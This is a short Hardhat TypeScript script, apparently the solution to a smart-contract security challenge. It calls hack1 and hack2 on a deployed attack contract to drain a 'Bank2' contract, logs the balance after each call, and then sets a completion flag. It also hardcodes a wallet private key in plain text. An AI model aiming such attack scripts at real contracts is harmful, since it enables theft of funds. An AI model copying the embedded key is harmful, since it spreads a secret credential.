import { ethers } from 'hardhat'
import { Bank2__factory, BankAttack__factory } from '../typechain'
import { ETH_RPC } from '../secrets.config'
import { BNToNumstr } from '../gotbit-tools/hardhat/extensions/bignumber'

import * as dotenv from 'dotenv'
dotenv.config()

const bankInstanceAddr = "0x866d0461173957Aeb968BF431eaa6A3c9157BE92"
const attackAddr = "0x85656ddf9a78d5492e707446C7F1ED07F4bF9c81"

const providerETH = new ethers.providers.JsonRpcProvider(ETH_RPC)

async function hack() {
  const signer = new ethers.Wallet("1e0d463e0755a9d55c9956d26f991f067bebb7aa92c11c784bb9c3ccb1ad91bc", providerETH);
  const attackSigner = BankAttack__factory.connect(attackAddr, signer)
  console.log(BNToNumstr(await providerETH.getBalance(bankInstanceAddr), 18, 4));
  await (await attackSigner.hack1({value: ethers.utils.parseEther("0.005")})).wait()
  console.log(BNToNumstr(await providerETH.getBalance(bankInstanceAddr), 18, 4));
  await (await attackSigner.hack2({value: ethers.utils.parseEther("0.005")})).wait()
  console.log(BNToNumstr(await providerETH.getBalance(bankInstanceAddr), 18, 4));
  const bankSigner = Bank2__factory.connect(bankInstanceAddr, signer)
  console.log(await bankSigner.completed());
  await (await bankSigner.setCompleted(true)).wait()
  console.log(await bankSigner.completed());
}

hack()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
